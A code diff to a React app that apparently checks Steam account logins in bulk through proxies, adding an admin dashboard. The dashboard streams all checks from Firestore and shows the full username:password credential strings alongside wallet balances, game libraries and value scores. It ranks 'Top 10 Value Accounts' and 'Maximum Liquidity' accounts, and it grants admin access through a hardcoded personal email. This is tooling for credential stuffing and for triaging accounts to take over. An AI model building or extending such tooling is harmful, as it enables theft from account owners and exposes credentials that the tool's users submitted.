@@ -3,10 +3,13 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import { useState, useCallback, useRef } from 'react';
+import { useState, useCallback, useRef, useEffect, FormEvent, ChangeEvent } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { Search, User, Gamepad2, AlertCircle, Loader2, ExternalLink, Upload, List, Play, Square, ChevronDown, ChevronUp, Download } from 'lucide-react';
+import { Search, User, Gamepad2, AlertCircle, Loader2, ExternalLink, Upload, List, Play, Square, ChevronDown, ChevronUp, Download, Shield, ShieldCheck, LogOut, Clock, Globe, CreditCard, TrendingUp, DollarSign } from 'lucide-react';
 import { SteamProfile, SteamGame, ProfileState } from './types';
+import { auth, db, loginWithGoogle, checkIsAdmin } from './firebase';
+import { onAuthStateChanged, signOut, User as FirebaseUser } from 'firebase/auth';
+import { collection, query, orderBy, limit, onSnapshot, Timestamp } from 'firebase/firestore';
 
 interface BulkAccount {
   id: string;
@@ -19,7 +22,12 @@ interface BulkAccount {
 }
 
 export default function App() {
-  const [mode, setMode] = useState<'single' | 'bulk'>('single');
+  const [mode, setMode] = useState<'single' | 'bulk' | 'admin'>('single');
+
+  // Admin State
+  const [user, setUser] = useState<FirebaseUser | null>(null);
+  const [isAdmin, setIsAdmin] = useState(false);
+  const [allChecks, setAllChecks] = useState<any[]>([]);
 
   // Single Mode State
   const [searchInput, setSearchInput] = useState('');
@@ -38,7 +46,74 @@ export default function App() {
   const [proxies, setProxies] = useState<string>('');
   const [isLoadingProxies, setIsLoadingProxies] = useState(false);
   const [expandedBulkAccountId, setExpandedBulkAccountId] = useState<string | null>(null);
+  const [isAdminLoading, setIsAdminLoading] = useState(false);
   const stopBulkRef = useRef(false);
+
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, async (u) => {
+        setUser(u);
+        if (u) {
+            // Bootstrap: If user is the developer, or in the admin list
+            const adminStatus = await checkIsAdmin(u.uid);
+            setIsAdmin(adminStatus || u.email === 'barnikbhowmik2@gmail.com');
+        } else {
+            setIsAdmin(false);
+        }
+    });
+    return () => unsubscribe();
+  }, []);
+
+  const [adminGameSearch, setAdminGameSearch] = useState('');
+
+  useEffect(() => {
+    if (isAdmin && mode === 'admin') {
+        const yesterday = new Date();
+        yesterday.setHours(yesterday.getHours() - 24);
+        
+        const q = query(
+            collection(db, 'checks'), 
+            orderBy('timestamp', 'desc'), 
+            limit(200)
+        );
+        const unsubscribe = onSnapshot(q, (snapshot) => {
+            const checks = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+            // Filter 24h client-side for better reactive feel, but could be done in query
+            const recentChecks = checks.filter((c: any) => {
+                if (!c.timestamp) return true;
+                const ts = c.timestamp instanceof Timestamp ? c.timestamp.toDate() : new Date(c.timestamp);
+                return ts > yesterday;
+            });
+            setAllChecks(recentChecks);
+        });
+        return () => unsubscribe();
+    }
+  }, [isAdmin, mode]);
+
+  const handleAdminLogin = async () => {
+      if (isAdminLoading) return;
+      setIsAdminLoading(true);
+      try {
+          const u = await loginWithGoogle();
+          const adminStatus = await checkIsAdmin(u.uid);
+          // Allow the core developer email manually too if Firestore doc hasn't been created yet
+          if (adminStatus || u.email === 'barnikbhowmik2@gmail.com') {
+            setIsAdmin(true);
+            setMode('admin');
+          } else {
+              alert("You are not an authorized admin.");
+              await signOut(auth);
+          }
+      } catch (e: any) {
+          if (e.code === 'auth/cancelled-popup-request' || e.code === 'auth/popup-closed-by-user') {
+              console.warn('Login popup closed or cancelled by user.');
+          } else {
+              console.error(e);
+              alert('Admin Login failed: ' + (e.message || 'Unknown error'));
+          }
+      } finally {
+          setIsAdminLoading(false);
+      }
+  };
 
   const loadFreeProxies = async () => {
     setIsLoadingProxies(true);
@@ -67,7 +142,7 @@ export default function App() {
     return null;
   };
 
-  const handleSearch = async (e: React.FormEvent) => {
+  const handleSearch = async (e: FormEvent) => {
     e.preventDefault();
     const rawInput = searchInput.trim();
     if (!rawInput) return;
@@ -150,7 +225,7 @@ export default function App() {
     }
   };
 
-  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleFileUpload = (e: ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
 
@@ -596,6 +671,228 @@ export default function App() {
     );
   };
 
+  const renderAdminPanel = () => {
+    if (!isAdmin) return null;
+
+    const successfulChecks = allChecks.filter(c => c.status === 'success');
+    const totalValue = successfulChecks.reduce((acc, c) => acc + (c.valueScore || 0), 0);
+    
+    // Search filter
+    const filteredChecks = allChecks.filter(check => {
+        if (!adminGameSearch) return true;
+        const query = adminGameSearch.toLowerCase().trim();
+        return (check.gameNames || []).some((name: string) => name.toLowerCase().includes(query)) ||
+               check.credentials?.toLowerCase().includes(query);
+    });
+
+    // Top 10 Global
+    const top10 = [...successfulChecks]
+        .sort((a, b) => (b.valueScore || 0) - (a.valueScore || 0))
+        .slice(0, 10);
+
+    // Find highest value account
+    const highestValAcc = successfulChecks.length > 0 
+        ? successfulChecks.reduce((prev, curr) => (curr.valueScore > prev.valueScore ? curr : prev), successfulChecks[0])
+        : null;
+
+    // Find highest balance account (using simple numeric parsing)
+    const highestBalAcc = successfulChecks.length > 0
+        ? successfulChecks.reduce((prev, curr) => {
+            const getBal = (s: string) => {
+                const m = (s || '').match(/(\d+[,.]\d+|\d+)/);
+                if (!m) return 0;
+                return parseFloat(m[1].replace(',', '.'));
+            };
+            return getBal(curr.walletBalance) > getBal(prev.walletBalance) ? curr : prev;
+        }, successfulChecks[0])
+        : null;
+
+    return (
+        <div className="flex-1 flex flex-col gap-6">
+            <div className="flex justify-between items-center bg-slate-900 border border-slate-800 p-4 rounded">
+                <div>
+                   <h2 className="text-xl font-black uppercase flex items-center gap-2">
+                       <ShieldCheck className="text-emerald-500 w-5 h-5" /> Admin Panel
+                   </h2>
+                   <p className="text-[10px] text-slate-500 uppercase font-mono mt-1">Live Monitoring • Global Checks (Last 24h)</p>
+                </div>
+                <div className="flex gap-4 items-center">
+                    <div className="text-right">
+                        <p className="text-[9px] uppercase text-slate-500 font-bold">Authenticated as</p>
+                        <p className="text-xs font-mono text-cyan-400">{user?.email}</p>
+                    </div>
+                    <button 
+                      onClick={() => { setMode('single'); signOut(auth); }}
+                      className="p-2 bg-slate-800 hover:bg-rose-900/40 text-slate-400 hover:text-rose-400 transition-colors rounded"
+                    >
+                        <LogOut className="w-4 h-4" />
+                    </button>
+                </div>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
+                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-slate-400">Hits (24h)</p>
+                   <p className="text-2xl font-black font-mono">{allChecks.length}</p>
+                </div>
+                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
+                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-emerald-500/70">Valid Hits</p>
+                   <p className="text-2xl font-black font-mono text-emerald-500">{successfulChecks.length}</p>
+                </div>
+                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
+                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-cyan-500/70">Daily Volume</p>
+                   <p className="text-2xl font-black font-mono text-cyan-500">{Math.round(totalValue)}</p>
+                </div>
+                <div className="bg-slate-900 border border-slate-800 p-4 rounded">
+                   <p className="text-[9px] uppercase text-slate-500 font-bold mb-1 tracking-widest text-rose-500/70">Burn Rate</p>
+                   <p className="text-2xl font-black font-mono text-rose-500">
+                       {allChecks.length ? Math.round((allChecks.filter(c => c.status === 'failed').length / allChecks.length) * 100) : 0}%
+                   </p>
+                </div>
+            </div>
+
+            {/* Top 10 Leaderboard */}
+            {top10.length > 0 && (
+                <div className="bg-slate-900 border border-slate-800 rounded overflow-hidden">
+                    <div className="p-3 bg-slate-950 border-b border-slate-800 flex items-center justify-between">
+                        <p className="text-[10px] uppercase font-bold tracking-widest text-cyan-500 flex items-center gap-2">
+                            <TrendingUp className="w-3 h-3"/> Top 10 Value Accounts Today
+                        </p>
+                    </div>
+                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-px bg-slate-800">
+                        {top10.map((acc, i) => (
+                            <div key={`top_${acc.id}`} className="bg-slate-900 p-3 hover:bg-slate-800 transition-colors">
+                                <div className="flex justify-between items-start mb-2">
+                                    <span className="text-[9px] font-black text-slate-600">#0{i+1}</span>
+                                    <span className="text-[10px] font-mono font-bold text-emerald-400">+{acc.valueScore}</span>
+                                </div>
+                                <p className="text-[11px] font-bold truncate text-slate-200">{acc.credentials.split(':')[0]}</p>
+                                <p className="text-[9px] text-slate-500 font-mono mt-1">{acc.gameCount} Games</p>
+                            </div>
+                        ))}
+                    </div>
+                </div>
+            )}
+
+            {(highestValAcc || highestBalAcc) && (
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    {highestValAcc && (
+                        <div className="bg-gradient-to-br from-cyan-900/40 to-slate-900 border border-cyan-500/30 p-4 rounded flex items-center gap-4">
+                            <div className="w-12 h-12 rounded bg-cyan-500/20 flex items-center justify-center text-cyan-400 flex-shrink-0">
+                                <TrendingUp className="w-6 h-6" />
+                            </div>
+                            <div className="min-w-0">
+                                <p className="text-[10px] uppercase font-bold text-cyan-400 tracking-widest">Global Peak Value</p>
+                                <p className="text-sm font-bold text-slate-100 truncate">{highestValAcc.credentials.split(':')[0]}</p>
+                                <p className="text-xs text-slate-400 font-mono">Score: {highestValAcc.valueScore} • {highestValAcc.gameCount} Games</p>
+                            </div>
+                        </div>
+                    )}
+                    {highestBalAcc && (
+                        <div className="bg-gradient-to-br from-amber-900/40 to-slate-900 border border-amber-500/30 p-4 rounded flex items-center gap-4">
+                            <div className="w-12 h-12 rounded bg-amber-500/20 flex items-center justify-center text-amber-400 flex-shrink-0">
+                                <DollarSign className="w-6 h-6" />
+                            </div>
+                            <div className="min-w-0">
+                                <p className="text-[10px] uppercase font-bold text-amber-400 tracking-widest">Maximum Liquidity</p>
+                                <p className="text-sm font-bold text-slate-100 truncate">{highestBalAcc.credentials.split(':')[0]}</p>
+                                <p className="text-xs text-slate-400 font-mono">Balance: {highestBalAcc.walletBalance}</p>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            )}
+
+            <div className="bg-slate-900 border border-slate-800 rounded overflow-hidden flex flex-col flex-1 overflow-y-auto min-h-[500px]">
+                <div className="p-4 bg-slate-950 border-b border-slate-800 flex flex-col md:flex-row justify-between items-center sticky top-0 z-10 gap-3">
+                    <p className="text-[10px] uppercase font-bold tracking-[0.2em]">Live History Feed</p>
+                    <div className="relative w-full md:w-64">
+                        <Search className="w-3 h-3 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
+                        <input 
+                            type="text" 
+                            placeholder="Search User or Game Title..." 
+                            className="w-full bg-slate-900 border border-slate-800 rounded px-8 py-1.5 text-[10px] font-mono text-slate-300 focus:outline-none focus:border-cyan-500"
+                            value={adminGameSearch}
+                            onChange={(e) => setAdminGameSearch(e.target.value)}
+                        />
+                    </div>
+                </div>
+                <div className="flex flex-col">
+                    {filteredChecks.map(check => (
+                        <div key={check.id} className="border-b border-slate-800/50 p-4 hover:bg-slate-950/50 flex flex-col md:flex-row gap-4 items-start md:items-center transition-colors">
+                            <div className="flex items-center gap-3 w-full md:w-72 flex-shrink-0">
+                                {check.avatar ? (
+                                    <div className="w-10 h-10 bg-slate-800 border border-slate-700 flex-shrink-0">
+                                       <img src={check.avatar} alt="" className="w-full h-full object-cover" />
+                                    </div>
+                                ) : (
+                                    <div className="w-10 h-10 bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-600">
+                                        <AlertCircle className="w-5 h-5" />
+                                    </div>
+                                )}
+                                <div className="min-w-0">
+                                    <p className="text-xs font-bold truncate text-slate-200 select-all">{check.credentials}</p>
+                                    <p className="text-[9px] text-slate-500 font-mono mt-1">
+                                        {check.timestamp instanceof Timestamp ? check.timestamp.toDate().toLocaleString() : 'Saving...'}
+                                    </p>
+                                </div>
+                            </div>
+                            
+                            <div className="flex gap-6 items-center flex-1">
+                                {check.status === 'success' ? (
+                                    <>
+                                        <div className="flex flex-col w-24">
+                                            <p className="text-[8px] uppercase text-slate-600">Persona</p>
+                                            <p className="text-[10px] text-slate-400 font-bold truncate">{check.personaName}</p>
+                                        </div>
+                                        <div className="flex flex-col w-16">
+                                            <p className="text-[8px] uppercase text-slate-600">Library</p>
+                                            <p className="text-[10px] text-cyan-500 font-mono font-bold tracking-widest">{check.gameCount} G</p>
+                                        </div>
+                                        <div className="flex flex-col w-12">
+                                            <p className="text-[8px] uppercase text-slate-600">Value</p>
+                                            <p className="text-[10px] text-emerald-500 font-mono font-bold">+{check.valueScore}</p>
+                                        </div>
+                                        <div className="flex flex-col w-20">
+                                            <p className="text-[8px] uppercase text-slate-600">Wallet</p>
+                                            <p className="text-[10px] text-amber-500 font-mono font-bold truncate">{check.walletBalance || '0.00'}</p>
+                                        </div>
+                                        {/* Match highlight */}
+                                        {adminGameSearch && (check.gameNames || []).some((n:string) => n.toLowerCase().includes(adminGameSearch.toLowerCase())) && (
+                                            <div className="flex-1 flex gap-2 overflow-x-auto custom-scrollbar pb-1">
+                                                {(check.gameNames || [])
+                                                    .filter((n:string) => n.toLowerCase().includes(adminGameSearch.toLowerCase()))
+                                                    .slice(0, 3)
+                                                    .map((n:string, idx:number) => (
+                                                        <span key={idx} className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded text-[9px] font-mono whitespace-nowrap">
+                                                            {n}
+                                                        </span>
+                                                    ))
+                                                }
+                                            </div>
+                                        )}
+                                    </>
+                                ) : (
+                                    <div className="flex items-center gap-2 text-rose-500/60 bg-rose-500/5 px-3 py-1 rounded-full border border-rose-500/10">
+                                        <AlertCircle className="w-3 h-3" />
+                                        <span className="text-[9px] uppercase font-bold tracking-widest">Failed: {check.error || 'Unknown Error'}</span>
+                                    </div>
+                                )}
+                            </div>
+                        </div>
+                    ))}
+                    {filteredChecks.length === 0 && (
+                        <div className="py-20 flex flex-col items-center text-slate-700 opacity-50">
+                            <Clock className="w-12 h-12 mb-4" />
+                            <p className="text-xs uppercase font-bold tracking-widest">No Signals Found</p>
+                        </div>
+                    )}
+                </div>
+            </div>
+        </div>
+    );
+  };
+
   return (
     <div className="min-h-screen bg-slate-950 text-slate-100 font-sans p-4 md:p-10 flex flex-col selection:bg-cyan-500/30">
       {/* Header Section */}
@@ -620,12 +917,20 @@ export default function App() {
                 >
                   Bulk
                 </button>
+                {isAdmin && (
+                    <button 
+                      onClick={() => setMode('admin')}
+                      className={`px-4 py-1 text-[10px] font-bold uppercase tracking-widest transition-colors ${mode === 'admin' ? 'bg-emerald-600 text-white' : 'text-slate-500 hover:text-slate-300'}`}
+                    >
+                      Admin
+                    </button>
+                )}
             </div>
         </div>
       </header>
 
       {/* Main Content Area */}
-      {mode === 'single' ? (
+      {mode === 'admin' ? renderAdminPanel() : mode === 'single' ? (
       <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 md:gap-8 flex-1 items-start">
         
         {/* Sidebar: Search & User Info */}
@@ -959,6 +1264,22 @@ export default function App() {
         <p>SECURE_ENCRYPTION_HASH: 0x{profile?.steamid ? parseInt(profile.steamid.slice(-8)).toString(16).toUpperCase() : '88A22F91'}</p>
         <p>© 2026 STEAM_PULSE_NETWORK</p>
       </footer>
+
+      {/* Admin Floating Trigger */}
+      {!isAdmin && (
+          <button 
+            onClick={handleAdminLogin}
+            disabled={isAdminLoading}
+            className="fixed bottom-4 right-4 p-3 bg-slate-900/80 hover:bg-slate-900 border border-slate-800 rounded-full text-slate-600 hover:text-cyan-500 transition-all opacity-80 hover:opacity-100 group shadow-2xl disabled:opacity-50"
+            title="Admin Login"
+          >
+            {isAdminLoading ? (
+               <Loader2 className="w-5 h-5 animate-spin text-cyan-500" />
+            ) : (
+               <Shield className="w-5 h-5 group-hover:scale-110 transition-transform" />
+            )}
+          </button>
+      )}
 
       <style dangerouslySetInnerHTML={{ __html: `
         .custom-scrollbar::-webkit-scrollbar { width: 4px; }
